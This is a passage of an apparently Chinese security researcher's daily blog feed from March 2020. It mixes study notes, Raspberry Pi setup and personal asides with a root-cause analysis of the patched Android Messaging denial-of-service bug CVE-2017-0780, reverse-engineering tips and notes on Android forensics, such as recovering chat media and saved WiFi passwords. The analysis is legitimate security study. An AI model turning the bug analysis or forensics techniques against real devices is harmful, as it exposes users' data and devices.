&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以上分析仅仅是拾人牙慧，有很多理解不到位的地方，有兴趣学习的同学可以移步以上提到的文章链接，原汁原味，更加详细&lt;/p&gt;

&lt;p&gt;学习Java反序列化漏洞的时候，搜到一个Java安全相关的GitHub项目，先在这里做个记录&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/threedr3am/learnjavabug&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;然后我依旧在学习的是scz的若干篇文章《Java RMI入门 1-5》，向小四学习！&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://scz.617.cn/network/202002221000.txt&lt;/li&gt;
  &lt;li&gt;http://scz.617.cn/network/202003081810.txt&lt;/li&gt;
  &lt;li&gt;http://scz.617.cn/network/202003121717.txt&lt;/li&gt;
  &lt;li&gt;http://scz.617.cn/network/202003191728.txt&lt;/li&gt;
  &lt;li&gt;http://scz.617.cn/network/202003241127.txt&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我多佩服小四这里就不过多的描述了，我在很多篇文章里都曾表达过我对大佬的崇拜，希望有生之年能追赶上大佬的脚步&lt;/p&gt;

&lt;p&gt;我挺感谢我认识的几个师傅，会客观的从旁观者角度给我一些职业发展上的建议，比如让我考虑去研究型的安全团队，其实我有时候也会想，如果我毕业后待在一个研究型的安全团队安心待三年到五年，身边都是每天研究漏洞到凌晨的大佬，现在会不会有很棒的产出呢？&lt;/p&gt;

&lt;p&gt;我是一个乐观的人，虽说现在搞业务安全，但无论在哪，都能调整好学习进度，只要热爱技术，一点不影响我每天都在好好学习呀:)&lt;/p&gt;

&lt;p&gt;从某些小渠道听到我司开始大面积优化了，大家说录音笔啥牌子好&lt;/p&gt;

&lt;p&gt;说来不怕大家笑话，我弄了本《机械制图》，想学习四足机器人，自学一下打打基础&lt;/p&gt;

&lt;p&gt;老了之后，锯锯木头，磨磨砂纸，安安静静，一坐一下午&lt;/p&gt;

&lt;p&gt;周末愉快:)&lt;/p&gt;
</description>
                <pubDate>Fri, 27 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/27/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.27.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/27/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.27.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.25</title>
                <description>&lt;p&gt;Android开发学着学着发现了一些奇奇怪怪的技术，我得回去再看看Java的技术，依旧是B站上面的教程，六百集，不过不是全部看一遍，怪我之前学的不扎实，关注了一些Java编程的公众号，学到了很多安全之外的技术，比如优化好几百万的数据表查询，其中用到的思想确实很开阔眼界，也有一些框架使用，之后开发一些自动化项目都是可以用得上的&lt;/p&gt;

&lt;p&gt;说到自动化，我最近在整理SO自动化的资料，这部分的基础知识其实不多，但是做好了基础的分析之后，在这个基础上去做很多其它事情，就很有意思了，比如漏洞挖掘，协议分析等&lt;/p&gt;

&lt;p&gt;胖友，听说过拒绝服务吗？&lt;/p&gt;

&lt;p&gt;CVE-2017-0780，Android Message的拒绝服务&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://android.googlesource.com/platform/packages/apps/Messaging/+/06cbd7f26ba58399f296d85fd155442c7f2ac837%5E%21/#F0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;补丁捕获了创建&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameSequenceDrawable&lt;/code&gt;对象时可能抛出的异常&lt;/p&gt;

&lt;p&gt;从补丁位置处开始分析&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@Override
public Drawable getDrawable(Resources resources) {
    return new FrameSequenceDrawable(mFrameSequence);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对象&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameSequenceDrawable&lt;/code&gt;定义如下&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://androidxref.com/7.1.1_r6/xref/frameworks/ex/framesequence/src/android/support/rastermill/FrameSequenceDrawable.java&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;它有两个构造方法，第一个不用管，我们看第二个，它会调用方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acquireAndValidateBitmap()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public FrameSequenceDrawable(FrameSequence frameSequence) {
    this(frameSequence, sAllocatingBitmapProvider);
}

public FrameSequenceDrawable(FrameSequence frameSequence, BitmapProvider bitmapProvider) {
    if (frameSequence == null || bitmapProvider == null) throw new IllegalArgumentException();

    mFrameSequence = frameSequence;
    mFrameSequenceState = frameSequence.createState();
    final int width = frameSequence.getWidth();
    final int height = frameSequence.getHeight();

    mBitmapProvider = bitmapProvider;
    mFrontBitmap = acquireAndValidateBitmap(bitmapProvider, width, height); // &amp;lt;--
    mBackBitmap = acquireAndValidateBitmap(bitmapProvider, width, height); // &amp;lt;--
    mSrcRect = new Rect(0, 0, width, height);
    mPaint = new Paint();
    mPaint.setFilterBitmap(true);

    mFrontBitmapShader
        = new BitmapShader(mFrontBitmap, Shader.TileMode.CLAMP, Shader.TileMode.CLAMP);
    mBackBitmapShader
        = new BitmapShader(mBackBitmap, Shader.TileMode.CLAMP, Shader.TileMode.CLAMP);

    mLastSwap = 0;

    mNextFrameToDecode = -1;
    mFrameSequenceState.getFrame(0, mFrontBitmap, -1);
    initializeDecodingThread();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acquireBitmap()&lt;/code&gt;可能返回空，而方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acquireAndValidateBitmap()&lt;/code&gt;没有做异常捕获，后面直接调用空对象操作，会造成拒绝服务&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private static Bitmap acquireAndValidateBitmap(BitmapProvider bitmapProvider,
        int minWidth, int minHeight) {
    Bitmap bitmap = bitmapProvider.acquireBitmap(minWidth, minHeight);

    if (bitmap.getWidth() &amp;lt; minWidth
            || bitmap.getHeight() &amp;lt; minHeight
            || bitmap.getConfig() != Bitmap.Config.ARGB_8888) {
        throw new IllegalArgumentException(&quot;Invalid bitmap provided&quot;);
    }

    return bitmap;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;acquireBitmap()&lt;/code&gt;最后会调用到方法&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nativeCreate()&lt;/code&gt;，是一个Native函数&lt;/p&gt;

&lt;p&gt;函数注册&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static const JNINativeMethod gBitmapMethods[] = {
    {   &quot;nativeCreate&quot;,             &quot;([IIIIIIZ)Landroid/graphics/Bitmap;&quot;,
        (void*)Bitmap_creator },
    ...
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;有兴趣的同学可以完整的跟一下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static jobject Bitmap_creator(JNIEnv* env, jobject, jintArray jColors,
                              jint offset, jint stride, jint width, jint height,
                              jint configHandle, jboolean isMutable) {
    SkColorType colorType = GraphicsJNI::legacyBitmapConfigToColorType(configHandle);
    if (NULL != jColors) {
        size_t n = env-&amp;gt;GetArrayLength(jColors);
        if (n &amp;lt; SkAbs32(stride) * (size_t)height) {
            doThrowAIOOBE(env);
            return NULL;
        }
    }

    // ARGB_4444 is a deprecated format, convert automatically to 8888
    if (colorType == kARGB_4444_SkColorType) {
        colorType = kN32_SkColorType;
    }

    SkBitmap bitmap;
    bitmap.setInfo(SkImageInfo::Make(width, height, colorType, kPremul_SkAlphaType));

    Bitmap* nativeBitmap = GraphicsJNI::allocateJavaPixelRef(env, &amp;amp;bitmap, NULL);
    if (!nativeBitmap) {
        return NULL;
    }

    if (jColors != NULL) {
        GraphicsJNI::SetPixels(env, jColors, offset, stride,
                0, 0, width, height, bitmap);
    }

    return GraphicsJNI::createBitmap(env, nativeBitmap,
            getPremulBitmapCreateFlags(isMutable));
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;想法：话说这种漏洞完全可以自动化啊，不是Fuzz，通过搜索含有抛出异常的函数，往回找调用栈，看是不是所有抛出的异常都被捕获了&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;我今天发现一个神器，用来搜索API文档贼好用，叫Dash，设置个快捷键，指哪打哪&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/35C4A6132172B4571B5EC96F157EF334.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最近春招了差不多开始进行了吧，建议各位同学在面试结束的时候，问一下面试官，办公区安不安静，要是办公区有那种leader一天到晚在工位打电话对需求指点江山，你会烦到掀桌:)&lt;/p&gt;

&lt;p&gt;来我岛玩啊，我建房子了&lt;/p&gt;
</description>
                <pubDate>Wed, 25 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/25/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.25.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/25/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.25.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.24</title>
                <description>&lt;p&gt;树莓派搭建的家庭影院这几天用下来还是比较稳定，用的很舒服，暂时还是用的外接移动硬盘，开机自动挂载，然后想看什么电影或者电视剧，提前下好，用SFTP传过去，上传速度是瓶颈，已经在尝试不同的方法了，可以提升体验的地方还有很多，边使用边记录边优化:)&lt;/p&gt;

&lt;p&gt;今天看到一个安卓安全汇总链接，我感觉这些学完脑袋都得锃光瓦亮了吧&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/alphaSeclab/android-security&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;很久没有打CTF了，怀念周末一个人在寝室里解题到不知几点的日子&lt;/p&gt;

&lt;p&gt;这是2016年阿里移动安全挑战赛的第一道题，直接上强混淆，一个块，两万行汇编，我动态调试时候，单步都卡，那会我逆向能力还比较弱，没有”真正”学会用脚本辅助分析，说真的，难惨了:(&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CB05742D636BD0178B8885EFEFC87476.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;天上什么时候能掉点钱下来啊！&lt;/p&gt;
</description>
                <pubDate>Tue, 24 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/24/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.24.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/24/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.24.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.23</title>
                <description>&lt;p&gt;两百多集的视频，我已经两倍速看了一百集了，基础的知识复习起来很快的，目前的状态还是处于查漏补缺&lt;/p&gt;

&lt;p&gt;已经挑选好了下一阶段的学习视频，大概能把自己的技能树点成下面这样，也就列个大概，没列出来的不代表我不会，列出来的也不一定就代表我会，逐渐梳理逐渐完善，最起码说起来得擅长Java嘛&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8A973BFA2A8A9635C61E641389E2934A.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我想周末早起读Paper，可惜醒来就是九点，于是在下午读了一篇Paper《EviHunter: Identifying Digital Evidence in the Permanent Storage of Android Devices via Static Analysis》，关于Android文件系统取证，发表于ACM CCS 2018，虽然是18年发表的，但也代表了一种自动化取证思路&lt;/p&gt;

&lt;p&gt;Paper，Slides都已经公开，目前我已经读完Paper了，接下来思考一下具体实现&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://arxiv.org/pdf/1808.06137.pdf&lt;/li&gt;
  &lt;li&gt;https://drive.google.com/file/d/1BuVSfVueBKidzo8T1cYBQB9jjR7QJuXH/view?usp=sharing&lt;/li&gt;
  &lt;li&gt;https://github.com/paradox5566/EviHunter&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于Android系统取证这部分，因为一直没有接触过相关业务，所以我也没怎么关注，但是又觉得不接触不行，这一天天的行走江湖，万一哪天客户说要搞个取证，结果别的团队蹭蹭蹭就上了，最后留下我啥也不会只能一脸懵逼&lt;/p&gt;

&lt;p&gt;鉴于没什么经验，先搜了一本书学习，老外写的，13年国内第一次印刷，这几天抓紧时间把这本看完，对Android系统取证有个初步认识&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B741450BF18A09DE1A3EAA41849E0697.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;取证包含的技术还是挺有趣的，都是实打实的具体需求，我这里举一些我目前学习到的例子&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;微信聊天数据，比如照片，语音，视频&lt;/li&gt;
  &lt;li&gt;连接过的WiFi，比如WiFi名称，WiFi密码&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这篇Paper所做的工作主要是自动化文件系统取证，也就是通过静态分析提取App获取数据并写出到文件的流程，然后生成一个App Evidence Database，再和需要进取证的系统进行文件数据匹配，就可以自动化形成一份初步的文件系统取证报告&lt;/p&gt;

&lt;p&gt;作者说以前的文件系统取证依赖手动分析，以及关键词匹配，比较繁琐，咱以前没接触过，不敢说也不敢问呐&lt;/p&gt;

&lt;p&gt;一个大概的流程如下，一股浓浓计算机老师用的PPT既视感&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2DE7BC003D8046F153C59E7784B020B3.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;其实前面什么流程图都是可有可无的，就是静态分析创建AED，然后扫描匹配出报告，最关键的就是如何生成AED，主要还是数据流分析，有兴趣的同学可以参考Paper&lt;/p&gt;

&lt;p&gt;我个人对这篇论文有如下一些看法：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;优点：静态分析是一个比较好的方法，能够尽可能的分析所有的代码，动态运行会有相当多的分支不能触发，当然有很多其它技术可以解决路径触发的问题，但是我们这里只需要提取数量并不大的指定路径，静态分析应该是相对好的选择&lt;/li&gt;
  &lt;li&gt;缺点：没有对动态下发逻辑进行判断，我们知道，现在安卓平台大量使用动态下发文件进行更新，有不少逻辑都是通过下发的代码包进行执行，本文没有对这部分进行考虑&lt;/li&gt;
  &lt;li&gt;改进：如果是我来做这份工作，我会考虑动静结合，静态可以使用作者的这部分工作，同时多一部分动态加载和热补丁相关的代码静态分析，然后尽可能去触发动态下发文件并加载的逻辑，把下发的文件结合原有的文件一起分析，可以更全面的进行文件系统取证&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;关于Android逆向的知识点以及工具使用，我要是想起来就会分享&lt;/p&gt;

&lt;p&gt;现在某个应用存在一个点击按钮发送数据的界面，我们想跟踪一下数据组包的流程，直接去硬刚代码肯定不行，头都要磕破，可以查看它当前运行界面最顶层的Activity，找到当前界面对应的Activity，就知道对应的入口，进而可以开始分析逻辑，需要怎么做呢？&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7.0
MacOS/Linux
$ adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;
    mResumedActivity: ActivityRecord{915f2ce u0 com.android.iotlauncher/.DefaultIoTLauncher t78}

Windows
$ adb shell dumpsys activity activities | findstr &quot;mFocusedActivity&quot;
    mResumedActivity: ActivityRecord{915f2ce u0 com.android.iotlauncher/.DefaultIoTLauncher t78}

8.0
MacOS/Linux
$ adb shell dumpsys activity activities | grep &quot;mResumedActivity&quot;
    mResumedActivity: ActivityRecord{915f2ce u0 com.android.iotlauncher/.DefaultIoTLauncher t78}

Windows
$ adb shell dumpsys activity activities | findstr &quot;mResumedActivity&quot;
    mResumedActivity: ActivityRecord{915f2ce u0 com.android.iotlauncher/.DefaultIoTLauncher t78}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;说到这里，我想到了一个很有意思的UI自动化点击思路，我先记录一下，等我这段时间学习完，调研一波看看业界的研究进度&lt;/p&gt;

&lt;p&gt;我最近发现一件事情：我跟不同年龄层的师傅们聊天，容易被刚毕业的DISS，但是跟比我毕业早的师傅们一起聊天就极其愉快了，可能是小盆友们觉得我都毕业好几年了比他们这群刚毕业的混得还差，优越感爆棚了吧:(&lt;/p&gt;

&lt;p&gt;我想想，确实也是，好好学习呦，不然马上要被2020届的DISS了呦&lt;/p&gt;

&lt;p&gt;人生真是起起落落落落落落，7000没到，兜兜转转回到6000的角落&lt;/p&gt;

&lt;p&gt;最后，开开心心上岛&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8172E94FA403BD31A9336B2C7A8A8CE0.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Mon, 23 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/23/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.23.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/23/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.23.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.20</title>
                <description>&lt;p&gt;首先感谢一下各位师傅，我都已经水成这样了还没取关我这个一亩三分地菜栏&lt;/p&gt;

&lt;p&gt;虽然我技术比较菜，顶多算个刚入门的小白，但是我有技术追求，属于有”技术自信”的那一类人，师傅们一起学习啊&lt;/p&gt;

&lt;p&gt;昨晚折腾了一下树莓派4B搭建家庭影院，用的是KODI，也没有研究多深入，现在是可以使用了，以后家里装修的时候，我要单独弄一间小房间，上面挂个牌子：逗猫阁，里面配置各种我定制的设备，装有履带的瓦力机器人，大土豆智能家居助手，树莓派定制的家庭影院……，想想就……伤心，要是有钱买好的产品谁搞这么麻烦:(&lt;/p&gt;

&lt;p&gt;大概讲一下流程，有兴趣的同学可以自己研究细节，其中我省略了部分系统配置操作&lt;/p&gt;

&lt;p&gt;从官网下载Raspbian系统，因为我们不需要界面，只需要命令行即可，下载LITE版本&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;raspberrypi.org/downloads/raspbian/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;刷入镜像，完成后首先是配置系统WiFi连接，这一步先不着急插卡启动，刷完系统后拔出卡片再次插入读卡器，在根目录添加一个配置文件&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpa_supplicant.conf&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;country=CN
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=1
network={
    ssid=&quot;WiFi SSID&quot;
    psk=&quot;password&quot;
    priority=5
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;插卡，上电，安装KODI&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt update
$ sudo apt install kodi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;启动KODI&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo service kodi start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;配置完之后，可以修改系统语言，如果HDMI输出没声音，可以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raspi-config&lt;/code&gt;里进行强行HDMI输出声音，数据源有两种模式，一种是NAS，一种是外接硬盘，NAS我感觉速度不是很够，我暂时是用的外接硬盘，在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/fstab&lt;/code&gt;里添加自动挂载即可开机自动挂载硬盘&lt;/p&gt;

&lt;p&gt;还有一些插件，脚本可以安装，我还没有研究到这一层次，等我体验一段时间，可以写一篇文章仔细讲讲，有兴趣的同学可以参考&lt;/p&gt;

&lt;p&gt;遥控器的话，我目前打算用红外线模式，还有一个是蓝牙，不过我目前只搜到了红外线的方案，蓝牙的方案还没搜到，但是根据我薄弱的硬件知识，蓝牙肯定是可行的，只是我想要一个酷炫一点的遥控器，不想每次还要拿出手机匹配一下蓝牙，那真的太弱了，直接买现成的电视机，流畅的体验难道不香吗？&lt;/p&gt;

&lt;p&gt;《Getting Started in Android Apps Pen-testing (Part-1)》：安卓应用漏洞挖掘教程，这一篇主要是讲环境搭建，这种文章中文版本的一大把，关注一下看看后续有没有好玩的思路，我个人建议真机运行，有一些应用只编译了ARM指令的SO，很多基于X86的模拟器是运行不了这种APP的，而且有价值研究的APP，怎么会不检测模拟器呢？胖友，用真机，少踩坑&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://blog.securitybreached.org/2020/03/17/getting-started-in-android-apps-pentesting/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;《Stantinko’s new cryptominer features unique obfuscation techniques》：一个挖矿病毒的字符串混淆&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.welivesecurity.com/2020/03/19/stantinko-new-cryptominer-unique-obfuscation-techniques/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;眼熟不？搞过OLLVM的看到这个都不在怕的，手持IDA脚本，扛上angr走一波符号执行，妥妥的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/CF37B9040AF58AF090C06BE4641907D9.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我唯一的担心就是，上这种混淆万一不稳定崩溃了，岂不是很尴尬&lt;/p&gt;

&lt;p&gt;《Evasions: Generic OS queries》：若干虚拟机环境检测技术，多学学，把没掌握的思路补上，以后万一有业务需求，不至于临时学手忙脚乱的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://evasions.checkpoint.com/techniques/generic-os-queries.html&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C7B0687584754AD2E449656635C4E6BF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;也有件好事，击中了3.655，另一个即将击中7000，今天回了波血，周末牛蛙煲有着落了&lt;/p&gt;
</description>
                <pubDate>Fri, 20 Mar 2020 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/security_daily/2020/03/20/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.20.html</link>
                <guid isPermaLink="true">http://localhost:4000/security_daily/2020/03/20/%E5%A4%A7%E5%9C%9F%E8%B1%86%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0-2020.03.20.html</guid>
            </item>
        
            <item>
                <title>大土豆安全笔记 2020.03.19</title>
                <description>&lt;p&gt;说来有趣，我最近在学习一些基础知识，像Java编程，Android开发，Github上有一些不错的项目，不过我主要是看B站的视频，跟着培训机构的老师过一遍知识点，把知识点过一遍之后，补一补自己漏掉的地方，顺便巩固知识，然后学习一些优化性能的技术，深入底层原理，学习接口的底层实现等，再之后的我就不过多在这里描述了，立FLAG容易倒&lt;/p&gt;

&lt;p&gt;现在看到了高级UI控件部分，估摸着下周就可以把常规的知识点都看完&lt;/p&gt;

&lt;p&gt;主要原因是因为最近做逆向的时候发现了一些我不懂的新语法，感觉再不学习我就要被淘汰了，像Kotlin是肯定要掌握了，还有谷歌现在主推的Jetpack&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://developer.android.google.cn/jetpack/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;按照谷歌的说法，这是一整套库，看来想统一生态了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4AEBF962C77D723089DF12CCB9AAA884.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;有一套讲解Jetpack的开发&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.bilibili.com/medialist/detail/ml457478326&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;希望这段时间能尽快学习完，然后往下一步进阶，去学习设计模式，我倒不是不会，只是没有系统学习过，而且我对开发也很感兴趣，学会正向开发，逆向的时候就知道这个语法的意思，以及关键的API是哪些&lt;/p&gt;

&lt;p&gt;我希望未来我的逆向水平可以达到拿到一个APK文件，无论是通过自研的工具还是直接JEB反编译，可以快速理清这个APP用了哪些设计模式，用了哪些第三方库，是否有高级语法（我个人认为这点很重要）等，这样我就可以对这个APP有一个初步的掌握，想要达到这个水平，现在就需要先跟上业界的开发技术&lt;/p&gt;

&lt;p&gt;多学习技术也是没坏处的，万一哪天被优化了我可以去搞安全开发，要是再被优化了我就去卖大米，希望大佬们多多捧场啊:)&lt;/p&gt;

&lt;p&gt;前几天我在用Android Things搞一个家庭助手，但是人脸识别模块的摄像头预览怎么都不行，一直黑屏，而且我遇到了一个悖论&lt;/p&gt;

&lt;p&gt;首先是使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TextureView&lt;/code&gt;来预览，但是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TextureView&lt;/code&gt;需要硬件加速，于是我开了硬件加速，但是开了硬件加速发现摄像头起不来了，说是不支持的外设&lt;/p&gt;

&lt;p&gt;不开硬件加速不能使用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TextureView&lt;/code&gt;，开了硬件加速摄像头起不来&lt;/p&gt;

&lt;p&gt;纠结了两天，我发现Android Things的主界面有一个摄像头预览入口，我就想，它是怎么实现预览的呢？&lt;/p&gt;

&lt;p&gt;然后我就把APP从系统中拷贝出来逆向了一波，Android 8.1用的是Camera2，它使用了大量的回调，一开始我先跟着文档写代码，能通过ImageView来进行拍照，整个流程是清楚的，所以在逆向的时候，我直接搜了几个关键的API，分分钟就找到了，这个写法说真的，如果我没有接触过Camera2的开发，还真的不知道，肯定浪费大量时间抓瞎&lt;/p&gt;

&lt;p&gt;会专业的正向开发辅助逆向真的事半功倍&lt;/p&gt;

&lt;p&gt;前两天收到了一封邮件&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7A5592E671F9C4A0573C32B7DCB49142.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我怕被钓鱼，于是跟师傅们聊了一下，说是泉哥微博发过这个人，哈哈哈哈哈哈哈哈哈哈&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/34B5E91EB5E060991A6275F1EF9B9984.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最近玄武的推送，我觉得没那么营养了&lt;/p&gt;

&lt;p&gt;倒是GOSSIP，推送的特别勤奋，隔两天就推荐一篇Paper，搞学术的就是不一样&lt;/p&gt;

&lt;p&gt;有一篇关于印度第三方支付的安全研究《Security Analysis of Unified Payments Interface and Payment Apps in India》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.usenix.org/system/files/sec20summer_kumar_prepub.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;RAID2020的C4P，想去诶&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://raid2020.org/call-for-papers/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Binder漏洞CVE-2020-0041的Slide和分析文章，我不是专业搞系统漏洞的，但是我感觉学习的几个Binder漏洞都很吸引人&lt;/p&gt;
&lt;ul&gt;
